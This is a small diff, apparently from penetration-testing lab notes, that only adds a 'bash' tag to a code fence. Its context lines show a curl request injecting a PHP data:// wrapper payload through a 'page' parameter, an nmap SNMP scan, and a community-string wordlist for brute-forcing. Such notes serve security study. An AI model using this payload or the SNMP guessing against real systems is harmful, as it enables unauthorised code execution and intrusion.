@@ -124,7 +124,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64
 sudo nmap -iL ips.txt -sU -p 161 --open -oG open-snmap.txt
 ~~~
 
-~~~
+~~~ bash
 echo public > community
 echo private >> community
 echo manager >> community
